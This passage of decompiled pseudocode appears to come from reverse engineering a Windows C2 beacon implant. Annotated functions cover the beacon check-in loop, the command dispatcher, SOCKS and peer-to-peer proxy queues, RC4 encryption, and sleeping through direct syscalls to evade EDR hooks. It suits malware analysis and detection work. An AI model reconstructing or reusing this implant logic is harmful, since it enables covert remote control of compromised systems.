                 *(uint *)(lVar8 + (ulonglong)*(ushort *)(lVar7 + (ulonglong)local_14 * 2) * 4);
  }
  if (((DAT_35d459050 != 0) && (DAT_35d459058 != 0)) && (DAT_35d459060 != 0)) goto LAB_35d44ce75;
  local_14 = local_14 + 1;
  goto LAB_35d44ce47;
}



/* FUN_35d44cee1 @ 35d44cee1 */

void FUN_35d44cee1(longlong param_1)

{
  if (param_1 != 0) {
    if (DAT_35d459070 == 0) {
      FUN_35d44cb1b();
    }
    if ((DAT_35d459058 != (code *)0x0) && (DAT_35d459068 != 0)) {
      (*DAT_35d459058)(DAT_35d459068,0,param_1);
    }
  }
  return;
}



/* FUN_35d44d0ce @ 35d44d0ce */

void FUN_35d44d0ce(longlong param_1)

{
  FUN_35d44cee1(param_1);
  return;
}



/* FUN_35d44d108 @ 35d44d108 */

void FUN_35d44d108(undefined8 *param_1)

{
  *param_1 = &PTR_FUN_35d458560;
  return;
}



/* FUN_35d44d14e @ 35d44d14e */

void FUN_35d44d14e(undefined8 *param_1)

{
  *param_1 = &PTR_FUN_35d458520;
  FUN_35d44d108(param_1);
  return;
}



/* FUN_35d44d1a4 @ 35d44d1a4 */

void FUN_35d44d1a4(undefined8 *param_1)

{
  *param_1 = &PTR_FUN_35d458540;
  FUN_35d44d14e(param_1);
  return;
}



/* FUN_35d44d200 @ 35d44d200 */

void FUN_35d44d200(longlong param_1,longlong param_2,int param_3)

{
  undefined1 uVar1;
  undefined4 local_10;
  undefined4 local_c;
  
  local_10 = 0;
  for (local_c = 0; local_c < 0x100; local_c = local_c + 1) {
    *(char *)(param_2 + local_c) = (char)local_c;
  }
  for (local_c = 0; local_c < 0x100; local_c = local_c + 1) {
    local_10 = (int)((uint)*(byte *)(param_2 + local_c) + local_10 +
                    (uint)*(byte *)(param_1 + local_c % param_3)) % 0x100;
    uVar1 = *(undefined1 *)(param_2 + local_c);
    *(undefined1 *)(param_2 + local_c) = *(undefined1 *)(param_2 + local_10);
    *(undefined1 *)(local_10 + param_2) = uVar1;
  }
  return;
}



/* FUN_35d44d2f0 @ 35d44d2f0 */

void FUN_35d44d2f0(longlong param_1,int param_2,longlong param_3)

{
  undefined1 uVar1;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  
  local_c = 0;
  local_10 = 0;
  for (local_14 = 0; local_14 < param_2; local_14 = local_14 + 1) {
    local_c = (local_c + 1) % 0x100;
    local_10 = (int)((uint)*(byte *)(param_3 + local_c) + local_10) % 0x100;
    uVar1 = *(undefined1 *)(param_3 + local_c);
    *(undefined1 *)(param_3 + local_c) = *(undefined1 *)(param_3 + local_10);
    *(undefined1 *)(local_10 + param_3) = uVar1;
    *(byte *)(param_1 + local_14) =
         *(byte *)(param_1 + local_14) ^
         *(byte *)(param_3 +
                  (ulonglong)(byte)(*(char *)(param_3 + local_10) + *(char *)(param_3 + local_c)));
  }
  return;
}



/* rc4_encrypt @ 35d44d40c */

void rc4_encrypt(longlong param_1,int param_2,longlong param_3,int param_4)

{
  undefined1 local_110 [264];
  
  FUN_35d44d200(param_3,(longlong)local_110,param_4);
  FUN_35d44d2f0(param_1,param_2,(longlong)local_110);
  return;
}



/* rc4_decrypt @ 35d44d45b */

void rc4_decrypt(longlong param_1,int param_2,longlong param_3,int param_4)

{
  rc4_encrypt(param_1,param_2,param_3,param_4);
  return;
}



/* job_tracker_alloc @ 35d44d4a0 */

undefined8 job_tracker_alloc(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/* job_tracker_init @ 35d44d4de */

void job_tracker_init(undefined8 *param_1,undefined4 param_2)

{
  FUN_35d456010(param_1);
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 4) = param_2;
  return;
}



/* FUN_35d44d590 @ 35d44d590 */

undefined8 *
FUN_35d44d590(undefined8 *param_1,longlong *param_2,undefined4 param_3,undefined8 param_4,
             undefined8 param_5)

{
  undefined4 uVar1;
  
  *(undefined4 *)param_1 = param_3;
  uVar1 = prng_next();
  *(undefined4 *)((longlong)param_1 + 4) = uVar1;
  param_1[1] = param_4;
  param_1[2] = param_5;
  param_1[3] = 0;
  *(undefined1 *)(param_1 + 4) = 1;
  FUN_35d455f40(param_2,param_1);
  return param_1;
}



/* job_tracker_process_queue @ 35d44d600 */

void job_tracker_process_queue(longlong *param_1,int *param_2)

{
  code *pcVar1;
  bool bVar2;
  longlong lVar3;
  undefined8 *puVar4;
  longlong lVar5;
  undefined4 *puVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  uint local_3c;
  undefined8 *local_38;
  undefined4 local_30;
  int local_2c;
  
  lVar3 = FUN_35d456cf0((longlong)param_1);
  if (lVar3 != 0) {
    for (local_2c = 0; uVar8 = (ulonglong)local_2c, uVar7 = FUN_35d456cf0((longlong)param_1),
        uVar8 < uVar7; local_2c = local_2c + 1) {
      local_30 = 0;
      lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
      if (*(char *)(lVar3 + 0x20) == '\x01') {
        puVar4 = (undefined8 *)heap_alloc((int)param_1[4]);
        local_3c = 0;
        pcVar1 = *(code **)(g_win32_api_table + 0x198);
        lVar3 = param_1[4];
        local_38 = puVar4;
        lVar5 = FUN_35d456070(param_1,(longlong)local_2c);
        (*pcVar1)(*(undefined8 *)(lVar5 + 8),puVar4,(int)lVar3,&local_3c,0);
        if (local_3c == 0) {
          lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
          *(undefined1 *)(lVar3 + 0x20) = 4;
          puVar6 = (undefined4 *)FUN_35d456070(param_1,(longlong)local_2c);
          binary_buffer_write_uint32(param_2,*puVar6);
          binary_buffer_write_uint32(param_2,0x23);
          lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
          binary_buffer_write_uint32(param_2,*(undefined4 *)(lVar3 + 4));
          lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
          binary_buffer_write_byte(param_2,*(undefined1 *)(lVar3 + 0x20));
        }
        else {
          lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
          *(ulonglong *)(lVar3 + 0x18) = *(longlong *)(lVar3 + 0x18) + (ulonglong)local_3c;
          puVar6 = (undefined4 *)FUN_35d456070(param_1,(longlong)local_2c);
          binary_buffer_write_uint32(param_2,*puVar6);
          binary_buffer_write_uint32(param_2,0x20);
          lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
          binary_buffer_write_uint32(param_2,*(undefined4 *)(lVar3 + 4));
          binary_buffer_write_byte(param_2,2);
          binary_buffer_write_bytes(param_2,local_38,local_3c);
          lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
          lVar3 = *(longlong *)(lVar3 + 0x10);
          lVar5 = FUN_35d456070(param_1,(longlong)local_2c);
          if (lVar3 == *(longlong *)(lVar5 + 0x18)) {
            lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
            *(undefined1 *)(lVar3 + 0x20) = 3;
          }
        }
        if (local_38 != (undefined8 *)0x0) {
          heap_realloc((longlong *)&local_38,*(uint *)(param_1 + 4));
        }
      }
      lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
      if (*(char *)(lVar3 + 0x20) == '\x03') {
        puVar6 = (undefined4 *)FUN_35d456070(param_1,(longlong)local_2c);
        binary_buffer_write_uint32(param_2,*puVar6);
        binary_buffer_write_uint32(param_2,0x20);
        lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
        binary_buffer_write_uint32(param_2,*(undefined4 *)(lVar3 + 4));
        binary_buffer_write_byte(param_2,3);
      }
      lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
      if ((*(char *)(lVar3 + 0x20) == '\x04') ||
         (lVar3 = FUN_35d456070(param_1,(longlong)local_2c), *(char *)(lVar3 + 0x20) == '\x03')) {
        bVar2 = true;
      }
      else {
        bVar2 = false;
      }
      if (bVar2) {
        lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
        if (*(longlong *)(lVar3 + 8) != 0) {
          pcVar1 = (code *)*g_syscall_table;
          lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
          (*pcVar1)(*(undefined8 *)(lVar3 + 8));
          lVar3 = FUN_35d456070(param_1,(longlong)local_2c);
          *(undefined8 *)(lVar3 + 8) = 0;
        }
        FUN_35d455d10(param_1,(longlong)local_2c);
        local_2c = local_2c + -1;
      }
    }
  }
  return;
}



/* FUN_35d44d9f0 @ 35d44d9f0 */

int FUN_35d44d9f0(int param_1)

{
  undefined4 local_c;
  
  local_c = param_1;
  if (param_1 % 3 != 0) {
    local_c = (param_1 / 3) * 3 + 3;
  }
  return local_c / 3 << 2;
}



/* FUN_35d44da7f @ 35d44da7f */

longlong FUN_35d44da7f(longlong param_1,int param_2)

{
  int iVar1;
  uint uVar2;
  longlong lVar3;
  int local_10;
  int local_c;
  
  if ((param_1 == 0) || (param_2 == 0)) {
    lVar3 = 0;
  }
  else {
    iVar1 = FUN_35d44d9f0(param_2);
    lVar3 = (**(code **)(g_win32_api_table + 0x160))(0x40,(longlong)(iVar1 + 1));
    if (lVar3 == 0) {
      lVar3 = 0;
    }
    else {
      *(undefined1 *)(lVar3 + iVar1) = 0;
      local_10 = 0;
      for (local_c = 0; local_c < param_2; local_c = local_c + 3) {
        if (local_c + 1 < param_2) {
          uVar2 = (uint)CONCAT11(*(byte *)(param_1 + local_c),
                                 *(undefined1 *)(param_1 + (local_c + 1)));
        }
        else {
          uVar2 = (uint)*(byte *)(param_1 + local_c) << 8;
        }
        if (local_c + 2 < param_2) {
          uVar2 = (uint)*(byte *)(param_1 + (local_c + 2)) | uVar2 << 8;
        }
        else {
          uVar2 = uVar2 << 8;
        }
        *(char *)(local_10 + lVar3) =
             s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_35d457220[(int)uVar2 >> 0x12];
        *(char *)((local_10 + 1) + lVar3) =
             s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_35d457220[(int)((int)uVar2 >> 0xc & 0x3f)];
        if (local_c + 1 < param_2) {
          *(char *)((local_10 + 2) + lVar3) =
               s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_35d457220[(int)((int)uVar2 >> 6 & 0x3f)];
        }
        else {
          *(undefined1 *)(lVar3 + (local_10 + 2)) = 0x3d;
        }
        if (local_c + 2 < param_2) {
          *(char *)((local_10 + 3) + lVar3) =
               s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_35d457220[(int)(uVar2 & 0x3f)];
        }
        else {
          *(undefined1 *)(lVar3 + (local_10 + 3)) = 0x3d;
        }
        local_10 = local_10 + 4;
      }
    }
  }
  return lVar3;
}



/* subsystem_alloc_generic @ 35d44e020 */

undefined8 subsystem_alloc_generic(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/* FUN_35d44e05e @ 35d44e05e */

undefined8 *
FUN_35d44e05e(undefined8 *param_1,longlong *param_2,undefined4 param_3,undefined2 param_4,
             undefined2 param_5,undefined8 param_6,undefined2 param_7,undefined8 param_8,
             undefined8 param_9)

{
  *(undefined4 *)param_1 = param_3;
  *(undefined2 *)((longlong)param_1 + 4) = param_4;
  *(undefined2 *)((longlong)param_1 + 6) = param_5;
  param_1[1] = param_6;
  *(undefined2 *)(param_1 + 2) = param_7;
  param_1[3] = param_8;
  param_1[4] = param_9;
  FUN_35d4562d0(param_2,param_1);
  return param_1;
}



/* subsystem_process_generic @ 35d44e0f0 */

void subsystem_process_generic(longlong *param_1,int *param_2)

{
  code *pcVar1;
  bool bVar2;
  longlong lVar3;
  undefined4 *puVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  int local_2c;
  undefined8 *local_28;
  uint local_20;
  int local_1c;
  
  lVar3 = FUN_35d456d10((longlong)param_1);
  if (lVar3 != 0) {
    for (local_1c = 0; uVar6 = (ulonglong)local_1c, uVar5 = FUN_35d456d10((longlong)param_1),
        uVar6 < uVar5; local_1c = local_1c + 1) {
      local_20 = 0;
      lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
      local_28 = (undefined8 *)FUN_35d45391b(*(undefined8 *)(lVar3 + 0x18),&local_20);
      if (local_20 != 0) {
        puVar4 = (undefined4 *)FUN_35d456400(param_1,(longlong)local_1c);
        binary_buffer_write_uint32(param_2,*puVar4);
        binary_buffer_write_uint32(param_2,0x8437);
        lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
        binary_buffer_write_byte(param_2,(char)*(undefined2 *)(lVar3 + 4));
        binary_buffer_write_byte(param_2,1);
        binary_buffer_write_bytes(param_2,local_28,local_20);
        heap_realloc((longlong *)&local_28,local_20);
      }
      lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
      if (*(short *)(lVar3 + 6) == 1) {
        local_2c = 0;
        lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
        if ((*(short *)(lVar3 + 4) == 3) ||
           (lVar3 = FUN_35d456400(param_1,(longlong)local_1c), *(short *)(lVar3 + 4) == 4)) {
          bVar2 = true;
        }
        else {
          bVar2 = false;
        }
        if (bVar2) {
          pcVar1 = *(code **)(g_win32_api_table + 0xa8);
          lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
          (*pcVar1)(*(undefined8 *)(lVar3 + 8),&local_2c);
        }
        else {
          lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
          if ((*(short *)(lVar3 + 4) == 1) ||
             (lVar3 = FUN_35d456400(param_1,(longlong)local_1c), *(short *)(lVar3 + 4) == 2)) {
            bVar2 = true;
          }
          else {
            bVar2 = false;
          }
          if (bVar2) {
            pcVar1 = *(code **)(g_win32_api_table + 0xb0);
            lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
            (*pcVar1)(*(undefined8 *)(lVar3 + 8),&local_2c);
          }
        }
        if (local_2c != 0x103) {
          lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
          if (*(short *)(lVar3 + 4) == 4) {
            lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
            *(undefined2 *)(lVar3 + 6) = 3;
          }
          else {
            lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
            *(undefined2 *)(lVar3 + 6) = 2;
          }
        }
      }
      lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
      if ((*(short *)(lVar3 + 6) == 3) ||
         (lVar3 = FUN_35d456400(param_1,(longlong)local_1c), *(short *)(lVar3 + 6) == 2)) {
        bVar2 = true;
      }
      else {
        bVar2 = false;
      }
      if (bVar2) {
        lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
        if ((*(short *)(lVar3 + 4) == 3) ||
           (lVar3 = FUN_35d456400(param_1,(longlong)local_1c), *(short *)(lVar3 + 4) == 4)) {
          bVar2 = true;
        }
        else {
          bVar2 = false;
        }
        if (bVar2) {
          pcVar1 = (code *)g_syscall_table[9];
          lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
          (*pcVar1)(*(undefined8 *)(lVar3 + 8),0);
        }
        else {
          lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
          if ((*(short *)(lVar3 + 4) == 1) ||
             (lVar3 = FUN_35d456400(param_1,(longlong)local_1c), *(short *)(lVar3 + 4) == 2)) {
            bVar2 = true;
          }
          else {
            bVar2 = false;
          }
          if (bVar2) {
            pcVar1 = (code *)g_syscall_table[8];
            lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
            (*pcVar1)(*(undefined8 *)(lVar3 + 8),0);
          }
        }
        lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
        if (*(longlong *)(lVar3 + 0x18) != 0) {
          pcVar1 = (code *)*g_syscall_table;
          lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
          (*pcVar1)(*(undefined8 *)(lVar3 + 0x18));
          lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
          *(undefined8 *)(lVar3 + 0x18) = 0;
        }
        lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
        if (*(longlong *)(lVar3 + 0x20) != 0) {
          pcVar1 = (code *)*g_syscall_table;
          lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
          (*pcVar1)(*(undefined8 *)(lVar3 + 0x20));
          lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
          *(undefined8 *)(lVar3 + 0x20) = 0;
        }
        puVar4 = (undefined4 *)FUN_35d456400(param_1,(longlong)local_1c);
        binary_buffer_write_uint32(param_2,*puVar4);
        binary_buffer_write_uint32(param_2,0x8437);
        lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
        binary_buffer_write_byte(param_2,(char)*(undefined2 *)(lVar3 + 4));
        lVar3 = FUN_35d456400(param_1,(longlong)local_1c);
        binary_buffer_write_byte(param_2,(char)*(undefined2 *)(lVar3 + 6));
        FUN_35d4560a0(param_1,(longlong)local_1c);
        local_1c = local_1c + -1;
      }
    }
  }
  return;
}



/* create_connector_http @ 35d44e630 */

undefined8 * create_connector_http(void)

{
  undefined8 *puVar1;
  
  puVar1 = (undefined8 *)heap_alloc_small(200);
  ConnectorHTTP_init(puVar1);
  return puVar1;
}



/*
 * beacon_main_loop @ 35d44e657
 *
 * Top-level beacon loop (called from DllMain → GetVersions export).
 *   1. master_api_resolver — resolve all runtime APIs
 *   2. implant_state_init — allocate and initialize implant state
 *   3. create_connector_http — construct ConnectorHTTP instance
 *   4. socks_proxy_init/start — initialize SOCKS proxy subsystem
 *   5. serialize_beacon_metadata — build initial check-in packet
 *   6. Loop:
 *      a. Send beacon via ConnectorHTTP (http_beacon_send)
 *      b. If response has data → command_dispatcher
 *      c. Process subsystem queues (jobs, SOCKS, P2P mesh)
 *      d. If pending output → send response back to C2
 *      e. Check is_beacon_active; if still active, calculate_sleep_seconds
 *      f. sleep_via_syscall (NtDelayExecution or NtWaitForSingleObject)
 *   7. On exit: cleanup and call exit action from config
 */

undefined8 beacon_main_loop(void)

{
  undefined4 uVar1;
  code *pcVar2;
  bool bVar3;
  undefined1 uVar4;
  int iVar5;
  uint uVar6;
  undefined4 uVar7;
  undefined8 uVar8;
  longlong *plVar9;
  int *piVar10;
  longlong lVar11;
  undefined7 extraout_var;
  undefined7 extraout_var_00;
  undefined7 extraout_var_01;
  undefined7 extraout_var_02;
  longlong local_50;
  uint local_48;
  uint local_44;
  int *local_40;
  
  uVar8 = master_api_resolver();
  if ((int)uVar8 != 0) {
    plVar9 = (longlong *)implant_state_alloc(0x78);
    implant_state_init(plVar9);
    g_implant_state = plVar9;
    g_connector_http = create_connector_http();
    plVar9 = (longlong *)socks_proxy_alloc(0x50);
    socks_proxy_init(plVar9);
    g_socks_proxy = plVar9;
    socks_proxy_start((longlong)plVar9);
    local_48 = 0;
    local_50 = serialize_beacon_metadata(g_implant_state,&local_48);
    iVar5 = (**(code **)*g_connector_http)(g_connector_http,g_implant_state[1] + 0x30,local_50,local_48);
    if (iVar5 != 0) {
      heap_realloc(&local_50,local_48);
      piVar10 = (int *)binary_buffer_alloc(0x18);
      binary_buffer_init_empty(piVar10);
      local_40 = piVar10;
      binary_buffer_write_uint32(piVar10,0);
      do {
        iVar5 = (**(code **)(*g_connector_http + 8))(g_connector_http);
        if (iVar5 != 0) {
          do {
            uVar6 = binary_buffer_get_size((longlong)local_40);
            piVar10 = local_40;
            if (uVar6 < 5) {
              (**(code **)(*g_connector_http + 0x20))(g_connector_http,0,0,g_implant_state[0xd]);
            }
            else {
              uVar7 = binary_buffer_get_size((longlong)local_40);
              binary_buffer_reset((longlong)piVar10,0,uVar7);
              plVar9 = g_connector_http;
              pcVar2 = *(code **)(*g_connector_http + 0x20);
              lVar11 = g_implant_state[0xd];
              uVar7 = binary_buffer_get_size((longlong)local_40);
              uVar8 = binary_buffer_get_data_ptr((longlong)local_40);
              (*pcVar2)(plVar9,uVar8,uVar7,lVar11);
              binary_buffer_set_flag(local_40,1);
              binary_buffer_write_uint32(local_40,0);
            }
            iVar5 = (**(code **)(*g_connector_http + 0x30))(g_connector_http);
            if ((iVar5 < 1) ||
               (lVar11 = (**(code **)(*g_connector_http + 0x28))(g_connector_http), lVar11 == 0)) {
              bVar3 = false;
            }
            else {
              bVar3 = true;
            }
            if (bVar3) {
              plVar9 = (longlong *)g_implant_state[2];
              uVar6 = (**(code **)(*g_connector_http + 0x30))(g_connector_http);
              uVar8 = (**(code **)(*g_connector_http + 0x28))(g_connector_http);
              command_dispatcher(plVar9,uVar8,uVar6,local_40);
            }
            (**(code **)(*g_connector_http + 0x38))(g_connector_http);
            job_tracker_process_queue((longlong *)g_implant_state[3],local_40);
            subsystem_process_generic((longlong *)g_implant_state[4],local_40);
            p2p_mesh_process_queue((longlong *)g_implant_state[6],local_40);
            p2p_link_process_queue((longlong *)g_implant_state[7],local_40);
            socks_proxy_process_queue(g_socks_proxy,local_40);
            uVar4 = is_beacon_active((longlong)g_implant_state);
            if ((int)CONCAT71(extraout_var,uVar4) != 0) {
              uVar6 = binary_buffer_get_size((longlong)local_40);
              plVar9 = g_connector_http;
              local_44 = (uint)(7 < uVar6);
              pcVar2 = *(code **)(*g_connector_http + 0x40);
              uVar7 = *(undefined4 *)(g_implant_state[1] + 0x14);
              uVar1 = *(undefined4 *)(g_implant_state[1] + 0x10);
              iVar5 = calculate_sleep_seconds((longlong)g_implant_state);
              uVar8 = socks_proxy_get_status((longlong)g_socks_proxy);
              (*pcVar2)(plVar9,uVar8,iVar5,uVar1,uVar7,local_44);
            }
            iVar5 = (**(code **)(*g_connector_http + 0x10))(g_connector_http);
            if ((iVar5 == 0) ||
               (uVar4 = is_beacon_active((longlong)g_implant_state),
               (int)CONCAT71(extraout_var_00,uVar4) == 0)) {
              bVar3 = false;
            }
            else {
              bVar3 = true;
            }
          } while (bVar3);
          uVar4 = is_beacon_active((longlong)g_implant_state);
          if (((int)CONCAT71(extraout_var_01,uVar4) == 0) &&
             (iVar5 = (**(code **)(*g_connector_http + 0x10))(g_connector_http), iVar5 != 0)) {
            bVar3 = true;
          }
          else {
            bVar3 = false;
          }
          if (bVar3) {
            flush_pending_responses((longlong *)g_implant_state[2],local_40);
            piVar10 = local_40;
            uVar7 = binary_buffer_get_size((longlong)local_40);
            binary_buffer_reset((longlong)piVar10,0,uVar7);
            plVar9 = g_connector_http;
            pcVar2 = *(code **)(*g_connector_http + 0x20);
            lVar11 = g_implant_state[0xd];
            uVar7 = binary_buffer_get_size((longlong)local_40);
            uVar8 = binary_buffer_get_data_ptr((longlong)local_40);
            (*pcVar2)(plVar9,uVar8,uVar7,lVar11);
            (**(code **)(*g_connector_http + 0x38))(g_connector_http);
          }
          (**(code **)(*g_connector_http + 0x18))(g_connector_http);
        }
        uVar4 = is_beacon_active((longlong)g_implant_state);
      } while ((int)CONCAT71(extraout_var_02,uVar4) != 0);
      binary_buffer_set_flag(local_40,0);
      piVar10 = local_40;
      if (local_40 != (int *)0x0) {
        binary_buffer_free_data();
        binary_buffer_free((longlong)piVar10);
      }
      (**(code **)(*g_connector_http + 0x48))(g_connector_http);
      sleep_via_syscall((uint)*(byte *)(g_implant_state[1] + 0x20));
    }
  }
  return 0;
}



/*
 * sleep_via_syscall @ 35d44ec47
 *
 * Sleeps between beacon callbacks using direct syscalls to avoid EDR hooks:
 *   - Mode 1: NtDelayExecution(FALSE, &timeout) via g_syscall_table+0x58
 *   - Mode 2: NtWaitForSingleObject(NULL, FALSE, &timeout) via g_syscall_table+0x60
 * The mode is set by config byte at offset 0x20 in the decrypted config.
 */

void sleep_via_syscall(int param_1)

{
  if (param_1 == 1) {
    (**(code **)(g_syscall_table + 0x58))(0);
  }
  else if (param_1 == 2) {
    (**(code **)(g_syscall_table + 0x60))(0);
  }
  return;
}



/* alloc_wrapper_small @ 35d44ec90 */

undefined8 alloc_wrapper_small(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/* connector_state_init @ 35d44ecce */

void connector_state_init(undefined8 *param_1)

{
  connector_base_constructor(param_1);
  return;
}



/* FUN_35d44ecea @ 35d44ecea */

void FUN_35d44ecea(longlong *param_1,int param_2,undefined4 param_3,uint param_4,undefined8 *param_5
                  )

{
  int iVar1;
  bool bVar2;
  undefined7 extraout_var;
  undefined8 uVar3;
  undefined8 *puVar4;
  longlong lVar5;
  longlong lVar6;
  ulonglong uVar7;
  int local_res10 [2];
  undefined4 local_res18;
  uint local_res20;
  undefined8 local_40;
  
  local_res10[0] = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  bVar2 = FUN_35d456c90(param_1,local_res10);
  if ((int)CONCAT71(extraout_var,bVar2) == 0) {
    local_40 = CONCAT44(local_res18,local_res10[0]);
    uVar3 = heap_alloc(local_res18);
    puVar4 = (undefined8 *)FUN_35d4558f0(param_1,local_res10);
    *puVar4 = local_40;
    puVar4[1] = 0;
    puVar4[2] = uVar3;
    puVar4[3] = 0;
  }
  uVar7 = (ulonglong)local_res20;
  lVar5 = FUN_35d4558f0(param_1,local_res10);
  lVar5 = *(longlong *)(lVar5 + 0x10);
  lVar6 = FUN_35d4558f0(param_1,local_res10);
  memcpy_wrapper((undefined8 *)(lVar5 + (ulonglong)*(uint *)(lVar6 + 8)),param_5,uVar7);
  lVar5 = FUN_35d4558f0(param_1,local_res10);
  *(uint *)(lVar5 + 8) = local_res20 + *(int *)(lVar5 + 8);
  lVar5 = FUN_35d4558f0(param_1,local_res10);
  iVar1 = *(int *)(lVar5 + 8);
  lVar5 = FUN_35d4558f0(param_1,local_res10);
  if (iVar1 == *(int *)(lVar5 + 4)) {
    lVar5 = FUN_35d4558f0(param_1,local_res10);
    *(undefined4 *)(lVar5 + 0x18) = 1;
  }
  return;
}



/* FUN_35d44ee2a @ 35d44ee2a */

void FUN_35d44ee2a(longlong *param_1,int param_2)

{
  uint uVar1;
  longlong lVar2;
  undefined1 (*pauVar3) [16];
  int local_res10 [6];
  
  local_res10[0] = param_2;
  lVar2 = FUN_35d4558f0(param_1,local_res10);
  if (*(longlong *)(lVar2 + 0x10) != 0) {
    lVar2 = FUN_35d4558f0(param_1,local_res10);
    uVar1 = *(uint *)(lVar2 + 4);
    lVar2 = FUN_35d4558f0(param_1,local_res10);
    heap_realloc((longlong *)(lVar2 + 0x10),uVar1);
  }
  pauVar3 = (undefined1 (*) [16])FUN_35d4558f0(param_1,local_res10);
  *pauVar3 = (undefined1  [16])0x0;
  pauVar3[1] = (undefined1  [16])0x0;
  FUN_35d455650(param_1,local_res10);
  return;
}



/* binary_buffer_alloc @ 35d44eec0 */

undefined8 binary_buffer_alloc(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/* binary_buffer_free @ 35d44eee1 */

void binary_buffer_free(longlong param_1)

{
  longlong local_res8 [4];
  
  local_res8[0] = param_1;
  heap_realloc(local_res8,0x18);
  return;
}



/* binary_buffer_init_empty @ 35d44eefe */

void binary_buffer_init_empty(undefined4 *param_1)

{
  undefined8 uVar1;
  
  param_1[1] = 0x1000;
  uVar1 = heap_alloc(param_1[1]);
  *(undefined8 *)(param_1 + 2) = uVar1;
  *param_1 = 0;
  param_1[4] = 0;
  return;
}



/* binary_buffer_init_with_data @ 35d44ef44 */

void binary_buffer_init_with_data(undefined4 *param_1,undefined8 param_2,undefined4 param_3)

{
  *(undefined8 *)(param_1 + 2) = param_2;
  *param_1 = param_3;
  param_1[1] = param_3;
  param_1[4] = 0;
  return;
}



/* binary_buffer_free_data @ 35d44ef82 */

void binary_buffer_free_data(void)

{
  return;
}



/* binary_buffer_reset @ 35d44ef8e */

void binary_buffer_reset(longlong param_1,uint param_2,undefined4 param_3)

{
  undefined1 *puVar1;
  
  puVar1 = (undefined1 *)((ulonglong)param_2 + *(longlong *)(param_1 + 8));
  *puVar1 = (char)((uint)param_3 >> 0x18);
  puVar1[1] = (char)((uint)param_3 >> 0x10);
  puVar1[2] = (char)((uint)param_3 >> 8);
  puVar1[3] = (char)param_3;
  return;
}



/* FUN_35d44eff6 @ 35d44eff6 */

void FUN_35d44eff6(longlong param_1,int param_2)

{
  undefined8 uVar1;
  undefined4 local_c;
  
  if (*(uint *)(param_1 + 4) < (uint)(*(int *)(param_1 + 0x10) + param_2)) {
    if (*(int *)(param_1 + 4) == 0) {
      local_c = 0x1000;
    }
    else {
      local_c = *(int *)(param_1 + 4) * 2;
    }
    if (local_c < (uint)(param_2 + *(int *)(param_1 + 0x10))) {
      local_c = param_2 + *(int *)(param_1 + 0x10) + 0x400;
    }
    uVar1 = heap_alloc_zeroed(*(undefined8 *)(param_1 + 8),local_c);
    *(undefined8 *)(param_1 + 8) = uVar1;
    *(uint *)(param_1 + 4) = local_c;
  }
  return;
}



/* FUN_35d44f088 @ 35d44f088 */

void FUN_35d44f088(int *param_1,undefined8 param_2)

{
  undefined1 *puVar1;
  
  FUN_35d44eff6((longlong)param_1,8);
  puVar1 = (undefined1 *)((ulonglong)(uint)param_1[4] + *(longlong *)(param_1 + 2));
  *puVar1 = (char)((ulonglong)param_2 >> 0x38);
  puVar1[1] = (char)((ulonglong)param_2 >> 0x30);
  puVar1[2] = (char)((ulonglong)param_2 >> 0x28);
  puVar1[3] = (char)((ulonglong)param_2 >> 0x20);
  puVar1[4] = (char)((ulonglong)param_2 >> 0x18);
  puVar1[5] = (char)((ulonglong)param_2 >> 0x10);
  puVar1[6] = (char)((ulonglong)param_2 >> 8);
  puVar1[7] = (char)param_2;
  *param_1 = *param_1 + 8;
  param_1[4] = param_1[4] + 8;
  return;
}



/* binary_buffer_write_uint32 @ 35d44f180 */

void binary_buffer_write_uint32(int *param_1,undefined4 param_2)

{
  undefined1 *puVar1;
  
  FUN_35d44eff6((longlong)param_1,4);
  puVar1 = (undefined1 *)((ulonglong)(uint)param_1[4] + *(longlong *)(param_1 + 2));
  *puVar1 = (char)((uint)param_2 >> 0x18);
